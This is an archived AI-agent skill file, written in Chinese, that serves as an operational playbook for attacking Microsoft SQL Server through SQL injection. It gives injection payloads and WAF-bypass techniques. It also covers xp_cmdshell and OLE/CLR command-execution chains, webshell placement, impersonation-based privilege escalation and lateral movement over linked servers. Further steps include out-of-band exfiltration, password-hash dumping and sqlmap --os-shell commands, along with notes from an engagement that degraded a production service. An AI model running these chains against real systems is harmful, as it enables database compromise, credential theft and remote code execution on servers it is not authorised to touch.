<!-- archived from /root/.hermes/skills/security/mssql-injection-family/SKILL.md on 2026-10-21 -->

---
name: mssql-injection-family
description: Use when attacking MSSQL/SQLi — 判型→报错/UNION/盲注→堆叠→getshell。
---

> 归档卡：原目录 `/root/.hermes/skills/security/mssql-injection-family`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/mssql-injection-family/…')`，不要相对 `references/legacy/` 解析。

# MSSQL 注入全打法家族

## 何时用
- 目标是 MSSQL/SQL Server（ASP/ASPX/IIS、`sqlsrv:`/`mssql` PDO、`.NET` 站点、ThinkPHP+sqlsrv 等）。
- 已有一个疑似注入点，需要判型、选形态、走完整利用链。
- 需要在 **不回显也能拿 shell/提权** 的场景下选最省事的链。

## 铁律
1. **先判型再打**：MSSQL 用 `+`、`--`、`sysobjects`、`db_name()`、`WAITFOR DELAY`、原生堆叠；MySQL 用 `concat()`、`#`、`database()`、`SLEEP()`。**把 MySQL payload 打在 MSSQL 上是纯浪费**（本项目踩过）。
2. **先证明参数进了 SQL，再谈注入**。最硬证据 = 后端回显的 SQL 里出现你的原始标记（TP6 debug 页、报错页、慢日志）。响应长度/耗时差分最弱，**必须多基线对照**。
3. **形态优先级**：报错注入（MSSQL 强类型，最省事）> UNION > 布尔盲注 > 时间盲注。时间盲注最后选，假阳性高。
4. **一次只改一个变量**；失败路径落盘，不重跑已判死路径。
5. **生产优先**：任何打库动作（尤其 TDS 爆破）必须同步监测应用侧延迟；发现拖慢立刻停 + 静默观察期，再汇报。详见 Pitfalls。
6. **留痕即失败**：用完还原（关 xp_cmdshell、REVERT 模拟、删临时表/webshell/备份文件）。

## 执行流（按序，每步都有硬信号才进下一步）

### 0 判型 & 自检权限
```sql
SELECT system_user,user_name(),db_name(),@@version;
SELECT IS_SRVROLEMEMBER('sysadmin'), IS_MEMBER('db_owner');
SELECT * FROM fn_my_permissions(NULL,'SERVER');      -- 逐条真权限, 比猜角色准
SELECT * FROM fn_my_permissions(NULL,'DATABASE');
SELECT * FROM sys.configurations WHERE name IN ('xp_cmdshell','Ole Automation Procedures','clr enabled');
SELECT * FROM master..sysservers;                     -- 有无可横向的链接
```

### 1 定注入面（最高优先，见 references/case-tp6-sqlsrv.md 的「标记法」）
按可能性排查：普通参数 → `ORDER BY`/排序列名 → 数值/`TOP n` 位 → `LIKE` → **HTTP 头(Origin/Referer/XFF/UA)** → JSON/XML 字段 → 二次注入。
- **数值位 = 免引号面**：能进 SQL 的数值参数可 `1;WAITFOR DELAY '0:0:5'--` 或 `1 AND 1=(SELECT @@version)`，**常用于绕只查单引号的中间件/WAF**。
- `ORDER BY` 位不能用引号闭合，只能走**函数报错**（`convert(int,@@version)`、`file_name(@@version)`）。

### 2 取数（四种形态）
报错 / UNION / 布尔 / 时间，完整 payload 见 **references/payloads.md**。一把梭拖库：
```sql
' AND 1=(SELECT CONCAT_WS(0x3a,table_schema,table_name,column_name)a
         FROM information_schema.columns FOR JSON AUTO)-- -
```

### 3 堆叠 → 命令执行 → shell
MSSQL 原生支持 `;` 堆叠（部分 WAF 只认 `;`，可用**无分号堆叠** `SELECT 'a' SELECT 'b'` 绕过）。
主要链：`EXEC AS LOGIN='sa'`(IMPERSONATE 误配) → `sp_configure 'xp_cmdshell',1` → `#tmp` 接输出 → 落 webshell 或外带。
备用链：`sp_oacreate`(OLE)、CLR UDF(SQLHttp)、`sp_execute_external_script`(Python/R)、差异/log 备份写 shell、`OPENROWSET(BULK)` 读配置。
完整命令见 **references/chains.md**。

### 4 提权 → 横向
- 提权：`EXEC AS LOGIN`(IMPERSONATE) → `sp_addsrvrolemember` → 沙盒/Jet/`xp_regwrite`/IFEO(老版本)。
- 横向：`sysservers` → `openquery("link", ...)` → `EXECUTE('...') AT LinkedServer`（跨森林也行）。
- 出网受限时的 OOB：`xp_dirtree`/`fn_xe_file_target_read_file`/`fn_get_audit_file`/`fn_trace_gettable`/**`sys.dm_os_enumerate_filesystem`(2026 新)** 打 collaborator；数据拼进 UNC 主机名，注意 label≤63/总长≤248 → 分块或 hex。

### 5 凭据
```sql
SELECT name, master.sys.fn_varbintohexstr(password_hash) FROM master.sys.sql_logins;  -- hashcat -m 132/1731
```
+ 读 `web.config`/`.env`（`OPENROWSET(BULK ...)`）拿应用侧 DB 口令。

### 6 WAF 绕过
MSSQL 空白符 `%1e`、非常规空白 `%C2%85`/`%C2%A0`、`/**/`、**限定符插空白 `infOrmatiOn_sChema%0f.%0ftAbles`**、0e/0x 前缀、`.from`、`\N`、大小写混写、`CHAR(39)`/hex 绕引号、**请求头运载 payload**。完整表见 references/payloads.md。

## 工具
```bash
sqlmap -r req.txt --batch --dbms=mssql --level 5 --risk 3 --technique=BEUST --sql-shell
sqlmap -u URL --file-read "C:/Windows/win.ini"      # BULK/OPENROWSET
sqlmap -u URL --os-shell                            # xp_cmdshell 链(自动 sp_configure 开)
impacket-mssqlclient user@host -windows-auth        # 直连 TDS
```
> `--os-shell` 内部：探 xp_cmdshell → 被禁则 sp_configure+RECONFIGURE → `EXEC master..xp_cmdshell` → **结果写临时表再 SELECT 回读** → 退出时清理。

## Pitfalls（本项目血泪，必读）
- **TDS 大并发爆破会连累生产**：40 线程打 1433 → 应用同一查询 `0.001s → 1.9s → SQLSTATE[HYT00] Login timeout`，我方 TDS 也从"秒回 18456"退化为 `EOF`（TCP 握手仍正常）。前置连接代理/审计网关是共享瓶颈。**纪律**：并发 ≤2，必须同步监测应用侧耗时（有 debug 页 `RunTime` 就直接用），>10× 立即停；停后 240s 静默观察再复测；"是否影响生产"要写进报告。
- **时间盲注假阳性**：端点本身 4–7s 慢时，`WAITFOR 5` 淹没在噪声里。先测 10 次基线的中位数/最大值，延时量取 >max+3σ；更优先用 SQL 回显判定。
- **把 MySQL payload 打 MSSQL**：本项目实测无果后才确认后端是 `sqlsrv`。判型放第一步。
- **库挂了会让注入测试"全命中"**：DB 故障时任何请求都抛 `PDOException`，看起来像"报错注入成功"。**先确认基线健康（良性值也报错 = 库坏了，不是注入）**。
- **`xp_cmdshell` 输出不回显**：堆叠注入后命令输出进不了 HTTP 响应，必须 `#tmp` 落表再读，或走 OOB。
- **`--` 后必须有空白**（`-- ` 或 `-- -`），否则 MSSQL 报语法错；`;%00` 在部分驱动可当注释。

## 参考文件
- `references/payloads.md` — 全形态 payload 速查（报错/UNION/盲注/时间/堆叠/文件/命令/OOB/链接/凭据/WAF 绕过表）。
- `references/chains.md` — 完整利用链：get-shell 三路、提权链、OOB 外带、工具命令、OPSEC 还原清单。
- `references/case-tp6-sqlsrv.md` — TP6 + sqlsrv 实战档案（含"标记法证明注入面"、Origin 头注入、中间件引号校验绕过思路、TDS 直连面结论）。

## 深度资料
配合 `sqlmap-chinese-guide`（tamper/参数）、`web-pentest`、`php-error-based-sqli`、`space-search-engine-enhance`。全网检索整理的长文档另存 `D:\渗透\712win3-brmt777_20260918\MSSQL注入_全打法手册_v1_20260919.md`。
